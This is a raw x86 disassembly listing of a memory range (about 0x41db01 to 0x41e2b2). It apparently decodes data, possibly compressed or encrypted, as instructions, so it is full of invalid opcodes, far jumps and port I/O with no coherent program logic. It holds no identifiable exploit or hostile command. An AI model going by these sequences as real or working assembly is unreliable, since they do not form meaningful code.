  41db01:	cmp    BYTE PTR [ebp+0x55],bh
  41db04:	cwde   
  41db05:	pushf  
  41db06:	aad    0xd3
  41db08:	adc    dh,BYTE PTR [ebx-0x22]
  41db0b:	pop    eax
  41db0c:	scas   al,BYTE PTR es:[edi]
  41db0d:	push   ebp
  41db0e:	push   esp
  41db0f:	xor    bl,cl
  41db11:	mov    ds:0xff900951,eax
  41db16:	pop    ebx
  41db17:	daa    
  41db18:	dec    BYTE PTR ds:0x1d8b0e
	...
  41db2a:	add    dl,bl
  41db2c:	xor    dl,BYTE PTR [edi-0x20500076]
  41db32:	jb     0x41db37
  41db34:	inc    ebp
  41db35:	mov    ds:0x8799225c,eax
  41db3a:	loop   0x41dad7
  41db3c:	cdq    
  41db3d:	add    DWORD PTR [eax],eax
  41db3f:	stos   BYTE PTR es:[edi],al
  41db40:	add    BYTE PTR [eax],al
  41db42:	add    BYTE PTR [esi+ecx*1-0x5b],bh
  41db46:	rcl    DWORD PTR [edi],0xa7
  41db49:	and    bh,dh
  41db4b:	inc    ecx
  41db4c:	jmp    0x8673:0x6a4c13e8
  41db53:	adc    al,0x39
  41db55:	push   ebx
  41db56:	adc    BYTE PTR [esi],0x3a
  41db59:	retf   0xa206
  41db5c:	adc    BYTE PTR [edi-0x3287e06f],ch
  41db62:	into   
  41db63:	es pop edi
  41db65:	adc    eax,0xd15568be
  41db6a:	mov    ds:0x19cda717,al
  41db6f:	imul   eax,edx,0xffffffc3
  41db72:	call   0x412eb6da
  41db77:	bound  ecx,QWORD PTR [ebx-0x17a53686]
  41db7d:	and    DWORD PTR [edi-0x6534d8d4],edi
  41db83:	push   edx
  41db84:	or     BYTE PTR [esi],0xad
  41db87:	out    0x51,eax
  41db89:	inc    ebp
  41db8a:	adc    ah,BYTE PTR [ecx+0x70]
  41db8d:	out    0xa0,al
  41db8f:	sub    eax,0x6ce7858f
  41db94:	ret    0x146c
  41db97:	icebp  
  41db98:	push   ebp
  41db99:	and    DWORD PTR [edi+0x52],esi
  41db9c:	psubb  mm6,QWORD PTR [esi]
  41db9f:	fsubr  QWORD PTR ds:0x215a8679
  41dba5:	addr16 inc al
  41dba8:	cmp    DWORD PTR [ecx],edx
  41dbaa:	cdq    
  41dbab:	jl     0x41db5f
  41dbad:	inc    eax
  41dbae:	jge    0x41dbe4
  41dbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb1:	push   esp
  41dbb2:	int3   
  41dbb3:	stc    
  41dbb4:	cwde   
  41dbb5:	cmp    BYTE PTR [ebp-0x8],ch
  41dbb8:	sub    DWORD PTR [ebx-0x17f880f2],0xb522a745
  41dbc2:	lods   al,BYTE PTR ds:[esi]
  41dbc3:	pop    eax
  41dbc4:	sti    
  41dbc5:	mov    ds:0xed12b21f,eax
  41dbca:	(bad)  
  41dbcb:	icebp  
  41dbcc:	sbb    eax,0x1cd424fb
  41dbd1:	and    DWORD PTR [esi+esi*1+0x66],ebp
  41dbd5:	inc    esi
  41dbd6:	sub    ch,BYTE PTR [eax]
  41dbd8:	out    0x12,eax
  41dbda:	sub    ecx,ebp
  41dbdc:	in     al,dx
  41dbdd:	je     0x41db65
  41dbdf:	call   0x9b4df16
  41dbe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbe5:	jge    0x41dc35
  41dbe7:	xchg   esi,eax
  41dbe8:	in     al,0xed
  41dbea:	mov    BYTE PTR [ebp+0x24],bh
	...
  41dbf9:	add    BYTE PTR [eax],al
  41dbfb:	dec    eax
  41dbfc:	in     al,0x3
  41dbfe:	fwait
  41dbff:	scas   eax,DWORD PTR es:[edi]
  41dc00:	(bad)  
  41dc01:	fdiv   st,st(7)
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax-0x65e73971],bl
  41dc0a:	rol    DWORD PTR [ebp-0x66],cl
  41dc0d:	add    DWORD PTR [eax],eax
  41dc0f:	stos   BYTE PTR es:[edi],al
  41dc10:	add    BYTE PTR [eax],al
  41dc12:	add    BYTE PTR [ecx-0x63],ch
  41dc15:	(bad)  
  41dc16:	sti    
  41dc17:	sub    BYTE PTR [edi+0x18de8073],dh
  41dc1d:	idiv   BYTE PTR [esp+ebx*4]
  41dc20:	pop    edx
  41dc21:	jge    0x41dbeb
  41dc23:	sbb    eax,0x6ce67f96
  41dc28:	inc    esi
  41dc29:	sbb    BYTE PTR [edx+0x49],al
  41dc2c:	leave  
  41dc2d:	fist   DWORD PTR [eax-0x32]
  41dc30:	cmp    ah,BYTE PTR [edx-0x1f840230]
  41dc36:	cmc    
  41dc37:	dec    esp
  41dc38:	int3   
  41dc39:	dec    esp
  41dc3a:	pop    eax
  41dc3b:	xor    DWORD PTR [esi+0x4896a3ef],0xfffffff0
  41dc42:	shl    BYTE PTR [edx+0x4f],0xa9
  41dc46:	ficom  DWORD PTR [ebp+edi*4+0x71]
  41dc4a:	push   edx
  41dc4b:	jg     0x41dc71
  41dc4d:	jnp    0x41dc71
  41dc4f:	popf   
  41dc50:	inc    edx
  41dc51:	retf   0x742c
  41dc54:	pop    esi
  41dc55:	popa   
  41dc56:	xor    eax,0xd7eb0b9b
  41dc5b:	pop    ecx
  41dc5c:	imul   eax,DWORD PTR [esi+0x51],0xd70fdedd
  41dc63:	stos   DWORD PTR es:[edi],eax
  41dc64:	pop    ss
  41dc65:	mov    al,0x31
  41dc67:	cld    
  41dc68:	repz daa 
  41dc6a:	jecxz  0x41dcc1
  41dc6c:	cmp    ah,BYTE PTR ds:0x7f62cf0a
  41dc72:	jecxz  0x41dcb1
  41dc74:	call   0x587a8d76
  41dc79:	fstp   DWORD PTR [eax+0x71]
  41dc7c:	sbb    dl,ah
  41dc7e:	pop    edx
  41dc7f:	jb     0x41dcd0
  41dc81:	lods   eax,DWORD PTR ds:[esi]
  41dc82:	push   eax
  41dc83:	jo     0x41dc11
  41dc85:	push   eax
  41dc86:	jo     0x41dc57
  41dc88:	inc    esp
  41dc89:	jno    0x41dc88
  41dc8b:	dec    ebx
  41dc8c:	aad    0xe
  41dc8e:	and    DWORD PTR [esi-0x34037048],eax
  41dc94:	(bad)  
  41dc95:	push   ss
  41dc96:	sub    esp,DWORD PTR [edi]
  41dc98:	int3   
  41dc99:	mov    WORD PTR [eax],cs
  41dc9b:	add    eax,0xf596fed2
  41dca0:	sbb    cl,cl
  41dca2:	jle    0x41dc2a
  41dca4:	cmp    DWORD PTR [edi+0x68b7cf91],esi
  41dcaa:	pushf  
  41dcab:	and    dl,dl
  41dcad:	push   ds
  41dcae:	cmp    al,0x18
  41dcb0:	aaa    
  41dcb1:	sub    al,0x24
  41dcb3:	mov    esp,0xae494c74
  41dcb8:	stos   DWORD PTR es:[edi],eax
  41dcb9:	sub    dh,BYTE PTR [ebp-0x16]
  41dcbc:	je     0x41dcbe
	...
  41dcca:	add    BYTE PTR [edx+0x4],dl
  41dccd:	mov    ds:0x72a6f682,al
  41dcd2:	aam    0x6d
  41dcd4:	xor    dh,BYTE PTR [edx]
  41dcd6:	and    eax,0xc01532c1
  41dcdb:	out    dx,eax
  41dcdc:	call   0x0:0xaa0001
  41dce3:	fild   QWORD PTR [ebx]
  41dce5:	in     al,dx
  41dce6:	xor    eax,DWORD PTR [eax-0x306a3ee4]
  41dcec:	jae    0x41dd12
  41dcee:	xor    edx,edi
  41dcf0:	sub    DWORD PTR [edx+0x170e5cbd],ebx
  41dcf6:	dec    ebx
  41dcf7:	adc    BYTE PTR [edi+0x6017e3f5],al
  41dcfd:	inc    edx
  41dcfe:	adc    eax,DWORD PTR [edx-0x58]
  41dd01:	scas   al,BYTE PTR es:[edi]
  41dd02:	ins    DWORD PTR es:[edi],dx
  41dd03:	pop    ds
  41dd04:	test   DWORD PTR [ebp+0x3ea8ad5e],edx
  41dd0a:	(bad)  
  41dd0b:	fst    QWORD PTR [ebp+0x32]
  41dd0e:	mov    ecx,0x9d40d593
  41dd13:	test   al,0xac
  41dd15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd16:	xor    esi,DWORD PTR [esi]
  41dd18:	jo     0x41dd96
  41dd1a:	test   eax,0x94c61378
  41dd1f:	mov    ecx,0xa4c6aba1
  41dd24:	xchg   ebp,eax
  41dd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd26:	dec    esi
  41dd27:	icebp  
  41dd28:	test   DWORD PTR [eax],esp
  41dd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd2b:	pop    edx
  41dd2c:	cmp    DWORD PTR [edi+0x1a05b768],ebx
  41dd32:	call   0x66c1:0x98b86d89
  41dd39:	and    eax,0xb14712cb
  41dd3e:	push   ecx
  41dd3f:	pop    es
  41dd40:	mov    bh,0x7e
  41dd42:	and    eax,0xce4fab41
  41dd47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd48:	jge    0x41dceb
  41dd4a:	fs mov al,0x1
  41dd4d:	or     eax,0xac57d3b3
  41dd52:	sbb    al,0x5
  41dd54:	xor    ah,BYTE PTR [ebx+0x6125d128]
  41dd5a:	shl    esp,1
  41dd5c:	add    al,bh
  41dd5e:	mov    BYTE PTR [esp+ebx*8],ch
  41dd61:	data16 cmp dh,BYTE PTR [ebx]
  41dd64:	out    dx,eax
  41dd65:	imul   ebx,edi,0xec741d7b
  41dd6b:	dec    edi
  41dd6c:	mov    dl,0xa
  41dd6e:	stc    
  41dd6f:	pusha  
  41dd70:	mov    ebx,0x6044bd71
  41dd75:	in     eax,dx
  41dd76:	jae    0x41ddf3
  41dd78:	inc    eax
  41dd79:	das    
  41dd7a:	sub    dh,BYTE PTR [ebx]
  41dd7c:	fnstenv [ecx+eax*1+0x2]
  41dd80:	sbb    eax,0x1a4a86e0
  41dd85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd87:	outs   dx,BYTE PTR ds:[esi]
  41dd88:	sbb    eax,DWORD PTR [edx+0x6487f4]
	...
  41dd9a:	add    BYTE PTR [eax],bh
  41dd9c:	push   0xffffff96
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0xa4,eax
  41dda8:	add    BYTE PTR [edi-0x4c],al
  41ddab:	cdq    
  41ddac:	fwait
  41ddad:	add    DWORD PTR [eax],eax
  41ddaf:	stos   BYTE PTR es:[edi],al
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    bl,bh
  41ddb4:	stc    
  41ddb5:	outs   dx,DWORD PTR ds:[esi]
  41ddb6:	loope  0x41ddd7
  41ddb8:	jle    0x41dd65
  41ddba:	dec    eax
  41ddbb:	aad    0xac
  41ddbd:	push   ecx
  41ddbe:	lock (bad) 
  41ddc0:	sub    al,0x3c
  41ddc2:	sub    DWORD PTR [edx+0x3ee10d0b],esi
  41ddc8:	int3   
  41ddc9:	shl    DWORD PTR [eax-0x7f3cbdcb],cl
  41ddcf:	cs pop ds
  41ddd1:	xlat   BYTE PTR ds:[ebx]
  41ddd2:	sub    DWORD PTR [edi+0x1b],esp
  41ddd5:	inc    edx
  41ddd6:	xchg   ecx,eax
  41ddd7:	jle    0x41de3e
  41ddd9:	mov    bh,0xf7
  41dddb:	inc    edi
  41dddc:	aaa    
  41dddd:	(bad)  
  41dddf:	lea    eax,[esi-0x70cb7dcb]
  41dde5:	push   ebp
  41dde6:	mov    edx,0x467229e2
  41ddeb:	add    BYTE PTR [esi+0x6d8279eb],cl
  41ddf1:	cmp    edi,DWORD PTR [ecx]
  41ddf3:	add    esp,ecx
  41ddf5:	sahf   
  41ddf6:	mov    cl,BYTE PTR [edx+eiz*1+0x758e2b61]
  41ddfd:	sub    eax,0xbc5a7ab9
  41de02:	xchg   ebx,eax
  41de03:	jl     0x41de14
  41de05:	imul   eax,DWORD PTR [eax],0xffffffae
  41de08:	cmp    DWORD PTR [ecx-0x2c],0x23
  41de0c:	loop   0x41de57
  41de0e:	lods   al,BYTE PTR ds:[si]
  41de10:	out    0xa8,al
  41de12:	fcomp  QWORD PTR [edx+0x60]
  41de15:	mov    DWORD PTR [ecx],eax
  41de17:	jmp    0x41ddbf
  41de19:	les    esp,FWORD PTR [eax+ebp*1-0x22]
  41de1d:	mov    dl,0xb9
  41de1f:	push   ecx
  41de20:	inc    ecx
  41de21:	sub    ch,BYTE PTR [ecx-0x63]
  41de24:	retf   
  41de25:	mov    edi,0xacbbf75b
  41de2a:	test   eax,0x51aae41b
  41de2f:	les    edx,FWORD PTR [edx-0x30]
  41de32:	call   0xe5f9:0x2551
  41de38:	(bad)  
  41de39:	(bad)  
  41de3b:	adc    eax,0x97bc193e
  41de40:	loop   0x41de2c
  41de42:	jbe    0x41dde3
  41de44:	mov    ?,WORD PTR [edi-0x1e]
  41de47:	jb     0x41de9f
  41de49:	std    
  41de4a:	in     eax,dx
  41de4b:	jl     0x41de67
  41de4d:	dec    ebx
  41de4e:	sahf   
  41de4f:	dec    esi
  41de50:	mov    BYTE PTR [edi],al
  41de52:	das    
  41de53:	(bad)  
  41de54:	jle    0x41de03
  41de56:	cwde   
  41de57:	xchg   esp,eax
  41de58:	enter  0xdc95,0x97
  41de5c:	adc    eax,DWORD PTR [eax]
	...
  41de6a:	add    cl,ch
  41de6c:	mov    ecx,0xf37a307a
  41de71:	jmp    0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	fadd   st(2),st
  41de79:	ret    
  41de7a:	add    eax,0x19c43
  41de7f:	stos   BYTE PTR es:[edi],al
  41de80:	add    BYTE PTR [eax],al
  41de82:	add    dh,bl
  41de84:	das    
  41de85:	cmp    ebp,DWORD PTR [eax+ebp*2]
  41de88:	and    BYTE PTR [ebp+eax*4+0x4d],bl
  41de8c:	or     ah,bh
  41de8e:	push   esp
  41de8f:	jns    0x41dea8
  41de91:	lods   al,BYTE PTR ds:[esi]
  41de92:	inc    ebp
  41de93:	imul   ebx
  41de95:	or     BYTE PTR [eax],bh
  41de97:	sahf   
  41de98:	xor    BYTE PTR [eax],bh
  41de9a:	or     eax,0xa5baaeba
  41de9f:	aaa    
  41dea0:	popa   
  41dea1:	sub    edx,esp
  41dea3:	mov    ch,ah
  41dea5:	sub    al,0x3e
  41dea7:	cmp    eax,0x3586afa0
  41deac:	jg     0x41deec
  41deae:	pop    DWORD PTR [edi]
  41deb0:	mov    ch,0xe2
  41deb2:	outs   dx,DWORD PTR ds:[esi]
  41deb3:	aaa    
  41deb4:	cmp    al,0xf4
  41deb6:	(bad)  
  41deb8:	int    0x6
  41deba:	jecxz  0x41deb6
  41debc:	jbe    0x41deed
  41debe:	out    0xca,eax
  41dec0:	pushf  
  41dec1:	push   edi
  41dec2:	add    dh,bl
  41dec4:	ins    BYTE PTR es:[edi],dx
  41dec5:	in     al,dx
  41dec6:	clc    
  41dec7:	xor    al,0xeb
  41dec9:	outs   dx,DWORD PTR ds:[esi]
  41deca:	sub    dh,BYTE PTR [ecx]
  41decc:	pusha  
  41decd:	jge    0x41df42
  41decf:	stc    
  41ded0:	out    dx,eax
  41ded1:	xor    eax,0x993434e0
  41ded6:	jg     0x41df3d
  41ded8:	mov    ds:0x91da5a7d,eax
  41dedd:	xor    DWORD PTR [edi-0x6],ecx
  41dee0:	aam    0xfb
  41dee2:	push   ss
  41dee3:	jmp    0x41de6b
  41dee5:	iret   
  41dee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee7:	punpckhwd mm2,QWORD PTR [esi+eiz*4]
  41deeb:	das    
  41deec:	pop    ebp
  41deed:	cmp    cl,BYTE PTR [eax]
  41deef:	aad    0xa2
  41def1:	dec    ecx
  41def2:	shl    DWORD PTR [ecx+0x450e71b8],1
  41def8:	jnp    0x41def1
  41defa:	mov    ebx,0x489232b3
  41deff:	pusha  
  41df00:	sub    eax,0x2647ad71
  41df05:	mov    ebx,esp
  41df07:	repnz cmc 
  41df09:	xchg   esp,edi
  41df0b:	out    0x91,eax
  41df0d:	dec    eax
  41df0e:	popf   
  41df0f:	ja     0x41df8f
  41df11:	jp     0x41ded0
  41df13:	jae    0x41df6d
  41df15:	mov    ebx,0xbab403ed
  41df1a:	fsub   st(0),st
  41df1c:	dec    edi
  41df1d:	scas   al,BYTE PTR es:[edi]
  41df1e:	mov    al,ds:0xc1dbf66c
  41df23:	icebp  
  41df24:	dec    edx
  41df25:	sar    DWORD PTR [ebx],0xc3
  41df28:	fimul  WORD PTR [eax+ebx*2+0xc857]
	...
  41df3b:	pop    ebx
  41df3c:	inc    ecx
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	mov    bh,BYTE PTR [ebp+0x44]
  41df4a:	stc    
  41df4b:	in     eax,dx
  41df4c:	pushf  
  41df4d:	add    DWORD PTR [eax],eax
  41df4f:	stos   BYTE PTR es:[edi],al
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    BYTE PTR [edi+0x1ee83b6f],al
  41df58:	icebp  
  41df59:	mov    eax,0xc88c7e54
  41df5e:	pusha  
  41df5f:	out    0x51,al
  41df61:	out    dx,eax
  41df62:	lds    edx,FWORD PTR [eax-0x6a]
  41df65:	pop    esp
  41df66:	xchg   ecx,eax
  41df67:	mov    bl,0xf8
  41df69:	mov    ah,0x86
  41df6b:	ret    
  41df6c:	push   esp
  41df6d:	xchg   BYTE PTR [ebp-0x65a20463],cl
  41df73:	fcomp  QWORD PTR [ebx+0x17]
  41df76:	iret   
  41df77:	dec    ebx
  41df78:	ror    BYTE PTR [eax],1
  41df7a:	mov    ds:0x9c6e371a,al
  41df7f:	or     ah,ah
  41df81:	sahf   
  41df82:	xchg   esi,eax
  41df83:	push   ss
  41df84:	pop    esi
  41df85:	ja     0x41df35
  41df87:	sti    
  41df88:	xor    esp,DWORD PTR [ebx+0x4ab4e42c]
  41df8e:	or     edi,DWORD PTR ds:0xf63aaefb
  41df94:	xchg   edx,eax
  41df95:	movntq (bad),mm1
  41df96:	out    0xca,eax
  41df98:	add    al,BYTE PTR [edx]
  41df9a:	mov    ah,BYTE PTR [ebp-0x1220e21a]
  41dfa0:	push   edx
  41dfa1:	in     al,dx
  41dfa2:	imul   DWORD PTR [ecx]
  41dfa4:	sub    al,0xbd
  41dfa6:	fisubr DWORD PTR [esi]
  41dfa8:	jmp    0x41df8d
  41dfaa:	xor    al,0x5a
  41dfac:	hlt    
  41dfad:	lea    ebp,[ebx-0x34]
  41dfb0:	inc    esp
  41dfb1:	dec    edi
  41dfb2:	add    bh,dl
  41dfb4:	push   0xff44e323
  41dfb9:	ja     0x41df6b
  41dfbb:	arpl   si,sp
  41dfbd:	mov    cl,0xae
  41dfbf:	jb     0x41df5b
  41dfc1:	ja     0x41df85
  41dfc3:	mov    ds:0xacbc7751,eax
  41dfc8:	imul   esp,DWORD PTR [edi+0x6947670b],0xffffffb4
  41dfcf:	fst    QWORD PTR [esi]
  41dfd1:	(bad)  
  41dfd2:	jmp    0x41e018
  41dfd4:	aas    
  41dfd5:	xor    DWORD PTR gs:[ebp-0x2c],esp
  41dfd9:	int3   
  41dfda:	mov    eax,0x8c48b5ea
  41dfdf:	and    cl,al
  41dfe1:	gs inc esp
  41dfe3:	sub    dh,ch
  41dfe5:	cmp    al,0x23
  41dfe7:	and    eax,0x20d36365
  41dfec:	cmp    bh,BYTE PTR [edi+0x65]
  41dfef:	icebp  
  41dff0:	cmc    
  41dff1:	jg     0x41dfc7
  41dff3:	jg     0x41e05c
  41dff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff6:	lahf   
  41dff7:	or     ebp,DWORD PTR [esi+eiz*8+0x53]
  41dffb:	xchg   BYTE PTR [eax+0x0],ah
	...
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	or     eax,0x97196db7
  41e01c:	popf   
  41e01d:	add    DWORD PTR [eax],eax
  41e01f:	stos   BYTE PTR es:[edi],al
  41e020:	add    BYTE PTR [eax],al
  41e022:	add    BYTE PTR [edi+eiz*1+0x41ac9da0],ah
  41e029:	mov    ecx,0x6f80ce3a
  41e02e:	fwait
  41e02f:	mov    al,ds:0xd9f8e606
  41e034:	mov    ds:0xa817f0bb,al
  41e039:	and    eax,0xf5286834
  41e03e:	fidiv  DWORD PTR [eax+0x109bec88]
  41e044:	aaa    
  41e045:	out    dx,eax
  41e046:	out    0xa6,eax
  41e048:	repnz imul edx,DWORD PTR [edi-0x546e6215],0xc3310a6d
  41e053:	ins    BYTE PTR es:[edi],dx
  41e054:	(bad)  
  41e055:	stc    
  41e056:	std    
  41e057:	(bad)  
  41e058:	dec    edx
  41e059:	aad    0xba
  41e05b:	cwde   
  41e05c:	test   BYTE PTR [edi],ch
  41e05e:	sti    
  41e05f:	leave  
  41e060:	lahf   
  41e061:	push   ds
  41e062:	loopne 0x41e0e2
  41e064:	add    esi,DWORD PTR [ecx-0x3]
  41e067:	mov    cl,0x98
  41e069:	mov    al,gs:0x8dcf06ac
  41e06f:	pop    ss
  41e070:	dec    ecx
  41e071:	iret   
  41e072:	adc    cl,BYTE PTR gs:[edx]
  41e075:	cmp    DWORD PTR [edi-0x68bb2c95],ebp
  41e07b:	(bad)  
  41e07c:	stos   BYTE PTR es:[edi],al
  41e07d:	add    cl,BYTE PTR [edi+0x69a82cd2]
  41e083:	jp     0x41e0de
  41e085:	test   DWORD PTR [ebx+edi*2-0x3b],esp
  41e089:	mov    edx,0xbb9241a5
  41e08e:	sbb    DWORD PTR [ebp-0xfec902e],ebp
  41e094:	inc    esp
  41e095:	ret    
  41e096:	cmp    DWORD PTR [eax-0x21068a19],esp
  41e09c:	sahf   
  41e09d:	scas   eax,DWORD PTR es:[edi]
  41e09e:	and    al,0x1a
  41e0a0:	sub    al,0x56
  41e0a2:	mov    ecx,ecx
  41e0a4:	retf   0xf845
  41e0a7:	add    BYTE PTR [edx-0x16ab8c5f],dh
  41e0ad:	gs push ebp
  41e0af:	call   0xda50:0xa610e0da
  41e0b6:	pop    ds
  41e0b7:	sub    ah,dh
  41e0b9:	cmp    BYTE PTR [edx+0x2bfcbaab],cl
  41e0bf:	jnp    0x41e0a0
  41e0c1:	retf   
  41e0c2:	mov    dh,0x1b
  41e0c4:	shr    BYTE PTR [edx+0xff630df],1
  41e0ca:	icebp  
  41e0cb:	sbb    al,0xfa
	...
  41e0d9:	add    BYTE PTR [eax],al
  41e0db:	outs   dx,BYTE PTR ds:[esi]
  41e0dc:	jae    0x41e0ce
  41e0de:	retf   0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0xc7068ce9
  41e0e9:	jno    0x41e146
  41e0eb:	inc    ecx
  41e0ec:	sahf   
  41e0ed:	add    DWORD PTR [eax],eax
  41e0ef:	stos   BYTE PTR es:[edi],al
  41e0f0:	add    BYTE PTR [eax],al
  41e0f2:	add    BYTE PTR [eax+0x3a33edfe],ah
  41e0f8:	dec    edi
  41e0f9:	pop    ecx
  41e0fa:	pop    ebx
  41e0fb:	sub    ebx,DWORD PTR [esi+0x6a3179b4]
  41e101:	pushf  
  41e102:	fist   WORD PTR [edi-0x57]
  41e105:	out    0x4b,al
  41e107:	sbb    al,0x90
  41e109:	in     al,0x91
  41e10b:	das    
  41e10c:	add    DWORD PTR [ebp-0x3271c98e],esp
  41e112:	push   es
  41e113:	stos   DWORD PTR es:[edi],eax
  41e114:	les    edx,FWORD PTR [eax+eax*4+0x22e83aa7]
  41e11b:	push   edx
  41e11c:	cmc    
  41e11d:	jb     0x41e144
  41e11f:	fs es cli 
  41e122:	mov    al,ds:0x3f59f0f8
  41e127:	dec    esi
  41e128:	sbb    eax,0xbd06d0b5
  41e12d:	call   0xd8d3:0x697af0c4
  41e134:	cwde   
  41e135:	inc    ecx
  41e137:	add    DWORD PTR [edx],edx
  41e139:	sub    al,BYTE PTR [esi+edi*4+0x2f]
  41e13d:	push   edx
  41e13e:	pop    esi
  41e13f:	bound  ebx,QWORD PTR [edi]
  41e141:	pop    edi
  41e142:	je     0x41e106
  41e144:	fistp  DWORD PTR [edx+0x3d]
  41e147:	adc    DWORD PTR [eax+0x17083376],ecx
  41e14d:	cmc    
  41e14e:	jbe    0x41e19d
  41e150:	jmp    0xdb45:0x683efe9f
  41e157:	js     0x41e1c3
  41e159:	push   0x6c43f59d
  41e15e:	push   esi
  41e15f:	shr    DWORD PTR [eax+0x2db00ccf],cl
  41e165:	mov    WORD PTR [esi-0x24],?
  41e168:	adc    DWORD PTR [ebp+eax*2-0x22e1db9b],ebp
  41e16f:	fstp   DWORD PTR [edi*8-0x5b12e16a]
  41e176:	ins    BYTE PTR es:[edi],dx
  41e177:	and    al,0xac
  41e179:	add    BYTE PTR [ecx-0x69],bl
  41e17c:	dec    eax
  41e17d:	loope  0x41e1a7
  41e17f:	loop   0x41e1e7
  41e181:	push   es
  41e182:	aam    0x98
  41e184:	lock inc ecx
  41e186:	jle    0x41e148
  41e188:	sbb    eax,0x7f22cd32
  41e18d:	inc    edi
  41e18e:	cmp    edi,ebx
  41e190:	mov    esi,esi
  41e192:	inc    ebp
  41e193:	xchg   esp,eax
  41e194:	das    
  41e195:	jmp    0x41e203
  41e197:	push   esi
  41e198:	xor    BYTE PTR [esi],dh
  41e19a:	cmp    al,0x33
  41e19c:	inc    edx
	...
  41e1a9:	add    BYTE PTR [eax],al
  41e1ab:	cmc    
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx+0x6096bfe1]
  41e1bb:	jmp    0x41e15b
  41e1bd:	add    DWORD PTR [eax],eax
  41e1bf:	stos   BYTE PTR es:[edi],al
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	add    dl,dh
  41e1c4:	push   ss
  41e1c5:	(bad)  [ebx]
  41e1c7:	inc    ecx
  41e1c8:	jmp    0xb0ba:0x2f18da9d
  41e1cf:	test   al,0x1b
  41e1d1:	push   edi
  41e1d2:	outs   dx,DWORD PTR ds:[esi]
  41e1d3:	pop    eax
  41e1d4:	cmp    DWORD PTR [ebx+0x5a],ecx
  41e1d7:	stos   DWORD PTR es:[edi],eax
  41e1d8:	push   edi
  41e1d9:	enter  0xb0a5,0xaa
  41e1dd:	cmp    DWORD PTR [eax-0x1c],edi
  41e1e0:	shl    BYTE PTR [esi+0x4d],cl
  41e1e3:	sbb    al,BYTE PTR [ebx+0x3c742a30]
  41e1e9:	in     al,dx
  41e1ea:	pusha  
  41e1eb:	xchg   ebx,eax
  41e1ec:	addr16 sub ecx,ebp
  41e1ef:	xchg   edx,eax
  41e1f0:	adc    DWORD PTR [ebp+0x48],esp
  41e1f3:	ss dec edi
  41e1f5:	test   al,0x51
  41e1f7:	push   esi
  41e1f8:	xchg   edx,eax
  41e1f9:	shl    DWORD PTR [ecx+ebp*8-0x22856fd2],cl
  41e200:	inc    ecx
  41e201:	fdivr  st(6),st
  41e203:	xchg   esi,eax
  41e204:	lods   eax,DWORD PTR ds:[esi]
  41e205:	or     cl,cl
  41e207:	push   es
  41e208:	or     BYTE PTR [ebp+0x28c059ec],dl
  41e20e:	data16 mov bl,0xfe
  41e211:	mov    edi,0xbcc68c77
  41e216:	mov    esp,0x901838a4
  41e21b:	aaa    
  41e21c:	imul   ebx,ebx,0x58
  41e21f:	mov    ebp,0xbdb2361e
  41e224:	xchg   DWORD PTR [esi-0x7a],ecx
  41e227:	push   cs
  41e228:	das    
  41e229:	cmp    DWORD PTR [ecx-0x604f36ac],ebx
  41e22f:	or     dh,bh
  41e231:	push   ss
  41e232:	dec    esp
  41e233:	fld    QWORD PTR [eax+0x3a]
  41e236:	dec    edi
  41e237:	dec    ebx
  41e238:	fcmovnbe st,st(0)
  41e23a:	cmp    DWORD PTR [ebp+ebx*2+0x3a],esi
  41e23e:	(bad)  
  41e240:	or     BYTE PTR [eax],ch
  41e242:	js     0x41e1f3
  41e244:	cmp    eax,0xfcc79e26
  41e249:	jns    0x41e1e2
  41e24b:	mov    ah,0xa7
  41e24d:	pop    DWORD PTR gs:[edx]
  41e250:	lock adc al,0x1c
  41e253:	pop    ds
  41e254:	mov    ch,0xa2
  41e256:	sbb    ebx,DWORD PTR [edx+esi*4]
  41e259:	mov    WORD PTR [edx],fs
  41e25b:	jecxz  0x41e2ba
  41e25d:	dec    ebx
  41e25e:	dec    esp
  41e25f:	push   eax
  41e260:	(bad)  
  41e261:	int3   
  41e262:	lahf   
  41e263:	cmp    al,0x3a
  41e265:	mov    bl,0xba
  41e267:	gs ins BYTE PTR es:[edi],dx
  41e269:	into   
  41e26a:	and    BYTE PTR [esi],bl
  41e26c:	je     0x41e26e
	...
  41e27a:	add    BYTE PTR [ebx],bh
  41e27c:	mov    cl,0x57
  41e27e:	lock fcomip st,st(6)
  41e281:	mov    edi,0xbb1c16fb
  41e286:	rcl    bl,0x2b
  41e289:	adc    al,0xf6
  41e28b:	xchg   ebp,eax
  41e28c:	lahf   
  41e28d:	add    DWORD PTR [eax],eax
  41e28f:	stos   BYTE PTR es:[edi],al
  41e290:	add    BYTE PTR [eax],al
  41e292:	add    bl,bh
  41e294:	cmp    eax,0x146292cf
  41e299:	xchg   ecx,eax
  41e29a:	pop    esi
  41e29b:	shr    esp,1
  41e29d:	call   0x72e9:0x47dc3811
  41e2a4:	jo     0x41e28b
  41e2a6:	jmp    0xf4bd6782
  41e2ab:	adc    BYTE PTR ds:0x3e23b607,bh
  41e2b1:	scas   al,BYTE PTR es:[edi]
  41e2b2:	retf   
